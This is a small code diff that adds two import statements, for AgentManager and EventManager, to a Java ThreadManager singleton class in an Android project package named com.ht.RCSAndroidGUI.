@@ -7,6 +7,9 @@
 
 package com.ht.RCSAndroidGUI;
 
+import com.ht.RCSAndroidGUI.agent.AgentManager;
+import com.ht.RCSAndroidGUI.event.EventManager;
+
 public class ThreadManager {
 	private volatile static ThreadManager singleton;
 
